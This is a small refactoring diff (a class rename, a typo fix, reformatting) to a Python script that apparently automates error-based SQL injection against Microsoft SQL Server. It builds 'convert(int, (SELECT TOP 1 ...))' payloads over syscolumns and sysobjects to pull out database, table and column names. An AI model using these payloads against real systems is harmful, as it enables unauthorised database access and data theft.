@@ -12,7 +12,7 @@ verbose = False
 wait_sec = 0.0
 
 
-class SendRequest:
+class RequestSender:
     import requests
     s = requests.Session()
     timeout = 12.0
@@ -97,8 +97,7 @@ class SendRequest:
 
 
 def print_verbose(payload):
-    splitted = payload.split(left)[1].split(right)[0]
-    print(f"debug: {urldec(left + splitted + right)}", file=sys.stderr)
+    print(f"debug: {urldec(left + payload + right)}", file=sys.stderr)
 
 
 def retr_loop(sender, payload1, payload2):
@@ -131,7 +130,7 @@ def retr_database(sender):
     if verbose:
         print_verbose(payload3)
     content = sender.send_request(payload3)
-    print(f"curent: {content}")
+    print(f"current: {content}")
 
     payload1 = urlenc(base[0])
     payload2 = urlenc(base[1])
@@ -164,8 +163,9 @@ def retr_columns(sender, databases, tables):
 
     base = ["convert(int, (SELECT TOP 1 ", "..syscolumns.name FROM ",
             "..syscolumns, ", "..sysobjects WHERE ",
-            "..syscolumns.id=", "..sysobjects.id AND ", "..sysobjects.name='",
-            "' AND ", "..syscolumns.name not in (", ")))"]
+            "..syscolumns.id=", "..sysobjects.id AND ",
+            "..sysobjects.name='", "' AND ",
+            "..syscolumns.name not in (", ")))"]
 
     columns = {}
     for db in databases:
@@ -278,7 +278,7 @@ def retr_proxy(raw_proxy):
 
 
 def main():
-    sender = SendRequest(args)
+    sender = RequestSender(args)
 
     if args.verbose:
         global verbose
@@ -314,8 +314,7 @@ def main():
                 raw_tables = [raw_tables[0]] * len(raw_databases)
 
             else:
-                print('error: argument length is different',
-                      file=sys.stderr)
+                print('error: argument length is different', file=sys.stderr)
                 exit(1)
 
         tables = retr_table_dic(raw_databases, raw_tables)
@@ -340,8 +339,7 @@ def main():
                     max(len(raw_databases), len(raw_tables))
 
             if len(raw_databases) != len(raw_tables) or len(raw_databases) != len(raw_columns):
-                print('error: argument length is different',
-                      file=sys.stderr)
+                print('error: argument length is different', file=sys.stderr)
                 exit(1)
 
         columns = retr_column_dic(
